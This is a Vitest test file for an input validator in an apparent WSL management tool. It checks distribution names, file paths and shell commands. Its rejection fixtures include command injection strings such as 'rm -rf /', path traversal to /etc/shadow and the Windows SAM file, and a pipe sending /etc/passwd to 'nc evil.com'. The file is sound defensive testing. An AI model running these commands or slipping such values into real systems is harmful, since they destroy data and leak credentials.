/**
 * InputValidator Real Tests
 * Tests actual input validation and sanitization
 *
 * @author Marcus Johnson, QA Manager
 */

import { describe, it, expect } from 'vitest';
import { InputValidator } from '../../../src/utils/inputValidator';
import { assertThrowsAsync } from '../../helpers/assertions';

describe('InputValidator - Real Input Validation', () => {
    describe('validateDistributionName()', () => {
        it('should accept valid distribution names', () => {
            const validNames = [
                'Ubuntu',
                'Ubuntu-20.04',
                'test_distro_123',
                'my-dev-environment',
                'Alpine3.15',
                'SUSE-Linux-Enterprise'
            ];

            for (const name of validNames) {
                expect(() => InputValidator.validateDistributionName(name)).not.toThrow();
            }
        });

        it('should reject empty or too short names', () => {
            expect(() => InputValidator.validateDistributionName('')).toThrow('Distribution name cannot be empty');
            expect(() => InputValidator.validateDistributionName('a')).toThrow('must be at least');
            expect(() => InputValidator.validateDistributionName('ab')).toThrow('must be at least');
        });

        it('should reject names that are too long', () => {
            const longName = 'a'.repeat(256);
            expect(() => InputValidator.validateDistributionName(longName)).toThrow('cannot exceed');
        });

        it('should reject names with invalid characters', () => {
            const invalidNames = [
                'test space',
                'test;command',
                'test&background',
                'test|pipe',
                'test>redirect',
                'test<input',
                'test\\backslash',
                'test/slash',
                'test:colon',
                'test*asterisk',
                'test?question',
                'test"quote',
                "test'apostrophe",
                'test`backtick',
                'test$variable',
                'test!exclaim',
                'test@at',
                'test#hash',
                'test%percent',
                'test^caret',
                'test(paren',
                'test)paren',
                'test[bracket',
                'test]bracket',
                'test{brace',
                'test}brace',
                'test=equal',
                'test+plus',
                'test~tilde'
            ];

            for (const name of invalidNames) {
                expect(() => InputValidator.validateDistributionName(name)).toThrow('contains invalid characters');
            }
        });

        it('should reject names with command injection attempts', () => {
            const injectionAttempts = [
                'test;rm -rf /',
                'test&&malicious',
                'test||error',
                'test`whoami`',
                'test$(id)',
                'test\necho hacked',
                'test\r\ndir c:',
                'test\0null'
            ];

            for (const attempt of injectionAttempts) {
                expect(() => InputValidator.validateDistributionName(attempt)).toThrow();
            }
        });
    });

    describe('validateFilePath()', () => {
        it('should accept valid file paths', () => {
            const validPaths = [
                '/tmp/test.tar',
                '/home/user/exports/distro.tar',
                'C:\\Users\\Test\\exports.tar',
                './relative/path/file.tar',
                'exports/ubuntu.tar',
                '/var/lib/wsl/distributions/export.tar'
            ];

            for (const path of validPaths) {
                expect(() => InputValidator.validateFilePath(path)).not.toThrow();
            }
        });

        it('should reject empty paths', () => {
            expect(() => InputValidator.validateFilePath('')).toThrow('File path cannot be empty');
        });

        it('should reject paths with null bytes', () => {
            const nullPaths = [
                'test\0.tar',
                '/tmp/file\x00.txt',
                'C:\\temp\0\\file.tar'
            ];

            for (const path of nullPaths) {
                expect(() => InputValidator.validateFilePath(path)).toThrow('null bytes');
            }
        });

        it('should reject paths with traversal attempts', () => {
            const traversalPaths = [
                '../../../etc/passwd',
                '..\\..\\..\\Windows\\System32\\config\\sam',
                '....//....//etc/shadow',
                '..;/etc/passwd',
                '%2e%2e%2f%2e%2e%2fetc%2fpasswd'
            ];

            for (const path of traversalPaths) {
                expect(() => InputValidator.validateFilePath(path)).toThrow('traversal');
            }
        });

        it('should reject UNC paths and network paths', () => {
            const networkPaths = [
                '\\\\server\\share\\file.tar',
                '//server/share/file.tar',
                'file://server/share/file.tar',
                'smb://server/share/file.tar'
            ];

            for (const path of networkPaths) {
                expect(() => InputValidator.validateFilePath(path)).toThrow();
            }
        });

        it('should handle special characters in valid paths', () => {
            const specialPaths = [
                '/tmp/test-file.tar',
                '/tmp/test_file.tar',
                '/tmp/test.file.tar',
                'C:\\Program Files\\WSL\\export.tar',
                '/home/user/my-exports (backup)/file.tar'
            ];

            for (const path of specialPaths) {
                expect(() => InputValidator.validateFilePath(path)).not.toThrow();
            }
        });
    });

    describe('validateCommand()', () => {
        it('should accept safe commands', () => {
            const safeCommands = [
                'echo "Hello World"',
                'ls -la',
                'pwd',
                'date',
                'whoami',
                'cat /proc/version',
                'df -h'
            ];

            for (const cmd of safeCommands) {
                expect(() => InputValidator.validateCommand(cmd)).not.toThrow();
            }
        });

        it('should reject empty commands', () => {
            expect(() => InputValidator.validateCommand('')).toThrow('Command cannot be empty');
        });

        it('should reject command chaining attempts', () => {
            const chainedCommands = [
                'ls; rm -rf /',
                'echo test && malicious',
                'pwd || evil',
                'test; echo hacked',
                'normal & background'
            ];

            for (const cmd of chainedCommands) {
                expect(() => InputValidator.validateCommand(cmd)).toThrow('Command chaining is not allowed');
            }
        });

        it('should reject pipe attempts', () => {
            const pipedCommands = [
                'cat /etc/passwd | nc evil.com 1234',
                'ls | grep secret',
                'echo test | tee /etc/passwd'
            ];

            for (const cmd of pipedCommands) {
                expect(() => InputValidator.validateCommand(cmd)).toThrow('contains dangerous characters');
            }
        });

        it('should reject redirection attempts', () => {
            const redirectCommands = [
                'echo hacked > /etc/passwd',
                'cat < /etc/shadow',
                'ls >> /tmp/output',
                'command 2>&1'
            ];

            for (const cmd of redirectCommands) {
                expect(() => InputValidator.validateCommand(cmd)).toThrow('contains dangerous characters');
            }
        });

        it('should reject command substitution attempts', () => {
            const substitutionCommands = [
                'echo `whoami`',
                'echo $(id)',
                'test `cat /etc/passwd`',
                'value=$(malicious)'
            ];

            for (const cmd of substitutionCommands) {
                expect(() => InputValidator.validateCommand(cmd)).toThrow('contains dangerous characters');
            }
        });

        it('should reject newline and special characters', () => {
            const specialCommands = [
                'normal\nmalicious',
                'test\r\ndir',
                'command\0null',
                'test\x1bESC'
            ];

            for (const cmd of specialCommands) {
                expect(() => InputValidator.validateCommand(cmd)).toThrow();
            }
        });
    });

    describe('sanitizeInput()', () => {
        it('should remove leading and trailing whitespace', () => {
            expect(InputValidator.sanitizeInput('  test  ')).toBe('test');
            expect(InputValidator.sanitizeInput('\ttest\n')).toBe('test');
            expect(InputValidator.sanitizeInput(' \r\n test \r\n ')).toBe('test');
        });

        it('should remove control characters', () => {
            expect(InputValidator.sanitizeInput('test\0null')).toBe('testnull');
            expect(InputValidator.sanitizeInput('test\x1bESC')).toBe('testESC');
            expect(InputValidator.sanitizeInput('test\x07bell')).toBe('testbell');
        });

        it('should preserve valid characters', () => {
            const validInputs = [
                'test-name',
                'test_name',
                'test.name',
                'Test123',
                'my-distro-2024'
            ];

            for (const input of validInputs) {
                expect(InputValidator.sanitizeInput(input)).toBe(input);
            }
        });

        it('should handle Unicode properly', () => {
            const unicodeInputs = [
                'café',
                '北京',
                '🚀test',
                'Zürich',
                'São_Paulo'
            ];

            for (const input of unicodeInputs) {
                const sanitized = InputValidator.sanitizeInput(input);
                expect(sanitized).toBe(input); // Should preserve valid Unicode
            }
        });
    });

    describe('isValidWindowsPath()', () => {
        it('should validate Windows paths', () => {
            const validPaths = [
                'C:\\Users\\Test\\file.tar',
                'D:\\exports\\distro.tar',
                'C:\\Program Files\\WSL\\export.tar',
                'E:\\temp\\test-export.tar'
            ];

            for (const path of validPaths) {
                expect(InputValidator.isValidWindowsPath(path)).toBe(true);
            }
        });

        it('should reject invalid Windows paths', () => {
            const invalidPaths = [
                'C:invalid',  // Missing backslash
                '\\\\uncpath\\share',  // UNC path
                'Z:\\..\\..\\Windows',  // Traversal
                'C:\\test:stream',  // Alternate data stream
                'C:\\con\\reserved',  // Reserved name
                'C:\\prn.txt',  // Reserved device
                'C:\\test<>file.tar',  // Invalid characters
                ':\\nodriver'  // No drive letter
            ];

            for (const path of invalidPaths) {
                expect(InputValidator.isValidWindowsPath(path)).toBe(false);
            }
        });
    });

    describe('isValidLinuxPath()', () => {
        it('should validate Linux paths', () => {
            const validPaths = [
                '/tmp/test.tar',
                '/home/user/exports/distro.tar',
                '/var/lib/wsl/export.tar',
                './relative/path.tar',
                '../parent/file.tar'
            ];

            for (const path of validPaths) {
                expect(InputValidator.isValidLinuxPath(path)).toBe(true);
            }
        });

        it('should reject paths with null bytes', () => {
            expect(InputValidator.isValidLinuxPath('/tmp/test\0.tar')).toBe(false);
        });

        it('should handle special but valid Linux paths', () => {
            const specialPaths = [
                '/tmp/test-file.tar',
                '/tmp/test_file.tar',
                '/tmp/test.file.tar',
                '/home/user/my exports/file.tar',  // Spaces allowed in Linux
                '/tmp/.hidden/file.tar'
            ];

            for (const path of specialPaths) {
                expect(InputValidator.isValidLinuxPath(path)).toBe(true);
            }
        });
    });

    describe('Real-World Validation Scenarios', () => {
        it('should handle mixed case appropriately', () => {
            expect(() => InputValidator.validateDistributionName('Ubuntu-Test')).not.toThrow();
            expect(() => InputValidator.validateDistributionName('ALPINE')).not.toThrow();
            expect(() => InputValidator.validateDistributionName('test-DISTRO')).not.toThrow();
        });

        it('should validate real WSL distribution names', () => {
            const realDistroNames = [
                'Ubuntu',
                'Ubuntu-20.04',
                'Ubuntu-22.04',
                'Debian',
                'kali-linux',
                'openSUSE-Leap-15.2',
                'SLES-15-SP3',
                'Alpine',
                'Fedora-Remix-for-WSL',
                'Arch'
            ];

            for (const name of realDistroNames) {
                expect(() => InputValidator.validateDistributionName(name)).not.toThrow();
            }
        });

        it('should validate real export paths', () => {
            const realPaths = [
                'C:\\Users\\JohnDoe\\Documents\\WSL-Backups\\ubuntu-backup.tar',
                '/mnt/c/WSL/exports/debian.tar',
                '/home/user/wsl-exports/alpine-2024-01-15.tar',
                'D:\\Backups\\WSL\\production-env.tar'
            ];

            for (const path of realPaths) {
                expect(() => InputValidator.validateFilePath(path)).not.toThrow();
            }
        });

        it('should handle edge cases correctly', () => {
            // Maximum length name (255 chars)
            const maxName = 'a'.repeat(255);
            expect(() => InputValidator.validateDistributionName(maxName)).not.toThrow();

            // Just over maximum
            const overMax = 'a'.repeat(256);
            expect(() => InputValidator.validateDistributionName(overMax)).toThrow();

            // Minimum valid name (3 chars)
            expect(() => InputValidator.validateDistributionName('abc')).not.toThrow();

            // Just under minimum
            expect(() => InputValidator.validateDistributionName('ab')).toThrow();
        });
    });
});